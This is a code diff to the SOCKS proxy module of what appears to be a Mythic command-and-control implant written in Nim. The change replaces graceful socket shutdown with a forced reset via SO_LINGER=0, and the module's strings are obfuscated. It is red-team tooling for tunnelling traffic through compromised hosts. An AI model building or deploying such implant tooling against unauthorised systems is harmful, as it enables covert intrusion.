@@ -8,12 +8,44 @@ import ../utils/strenc
 # POSIX: standard sys/socket.h link
 when defined(windows):
   proc cShutdown(fd: cint, how: cint): cint {.importc: "shutdown", dynlib: "ws2_32".}
+  proc cSetsockopt(fd: cint, level: cint, optname: cint, optval: pointer, optlen: cint): cint {.importc: "setsockopt", dynlib: "ws2_32".}
+  type CLinger = object
+    l_onoff: cushort
+    l_linger: cushort
+  const cSOL_SOCKET = 0xFFFF.cint
+  const cSO_LINGER = 0x0080.cint
 else:
   proc cShutdown(fd: cint, how: cint): cint {.importc: "shutdown", header: "<sys/socket.h>".}
+  proc cSetsockopt(fd: cint, level: cint, optname: cint, optval: pointer, optlen: cint): cint {.importc: "setsockopt", header: "<sys/socket.h>".}
+  type CLinger = object
+    l_onoff: cint
+    l_linger: cint
+  when defined(linux):
+    const cSOL_SOCKET = 1.cint
+    const cSO_LINGER = 13.cint
+  else:  # macOS, BSD
+    const cSOL_SOCKET = 0xFFFF.cint
+    const cSO_LINGER = 0x0080.cint
 
 # Constant 1 = SHUT_WR (POSIX) = SD_SEND (Windows) - close write side, send FIN, keep reading
 proc shutdownSocket(fd: SocketHandle) =
   discard cShutdown(fd.cint, 1.cint)
+
+proc resetSocket(sock: Socket) =
+  ## Shutdown + SO_LINGER=0 + close to force RST (no TIME-WAIT)
+  ## shutdown(RDWR) first to unblock any threads blocked on recv/send
+  ## (Linux won't release a socket on close() if another thread holds it in a syscall)
+  ## Then SO_LINGER=0 + close sends RST instead of FIN
+  let fd = sock.getFd()
+  # Shutdown RDWR to unblock blocked recv/send in reader/writer threads
+  discard cShutdown(fd.cint, 2.cint)  # SHUT_RDWR = 2
+  # Set SO_LINGER=0 so close() sends RST instead of FIN
+  when defined(windows):
+    var linger = CLinger(l_onoff: 1.cushort, l_linger: 0.cushort)
+  else:
+    var linger = CLinger(l_onoff: 1.cint, l_linger: 0.cint)
+  discard cSetsockopt(fd.cint, cSOL_SOCKET, cSO_LINGER, addr linger, sizeof(linger).cint)
+  sock.close()
 
 # SOCKS5 Protocol Constants
 const
@@ -352,21 +384,19 @@ proc socks*(taskId: string, params: JsonNode): JsonNode =
       activeSocksConnections = initTable[uint32, SocksConnection]()
       
       result = mythicSuccess(taskId, obf("SOCKS proxy started on port ") & $port)
-      result[obf("completed")] = %false
-      result[obf("status")] = %obf("processing")
+      result[obf("completed")] = %true
     
     of obf("stop"):
       socksActive = false
       
-      # Shutdown all sockets to send FIN and unblock threads - don't join here
-      # to avoid blocking the agent. checkActiveSocksConnections will handle
-      # full cleanup (join + free) once threads exit naturally after shutdown.
+      # Set SO_LINGER=0 and close sockets to force RST (no TIME-WAIT)
+      # Matches Poseidon's behavior: hard close goes directly to CLOSED state
       for serverId, conn in activeSocksConnections:
         conn.active = false
         if not conn.sharedPtr.isNil:
           conn.sharedPtr.active = false
         if conn.state == Connected:
-          try: shutdownSocket(conn.socket.getFd())
+          try: resetSocket(conn.socket)
           except: discard
       
       result = mythicSuccess(taskId, obf("SOCKS proxy stopped"))
@@ -398,11 +428,9 @@ proc handleSocksMessages*(messages: seq[JsonNode]): seq[JsonNode] =
         conn.active = false
         if not conn.sharedPtr.isNil:
           conn.sharedPtr.active = false
-        # Shutdown socket to send FIN and interrupt blocking recv in reader thread
+        # Set SO_LINGER=0 to force RST on close (no TIME-WAIT)
         if conn.state == Connected:
-          try: shutdownSocket(conn.socket.getFd())
-          except: discard
-          try: conn.socket.close()
+          try: resetSocket(conn.socket)
           except: discard
         debug &"[DEBUG] SOCKS: Marked connection {serverId} for cleanup (reader will drain remaining data)"
       continue
@@ -488,10 +516,8 @@ proc checkActiveSocksConnections*(): seq[JsonNode] =
     if activeSocksConnections.hasKey(serverId):
       let conn = activeSocksConnections[serverId]
       if conn.state == Connected:
-        # Shutdown socket first to send FIN and unblock blocking recv/send in threads
-        try: shutdownSocket(conn.socket.getFd())
-        except: discard
-        try: conn.socket.close()
+        # Set SO_LINGER=0 to force RST on close (no TIME-WAIT)
+        try: resetSocket(conn.socket)
         except: discard
         
         # Join threads (they should exit quickly now that socket is closed)
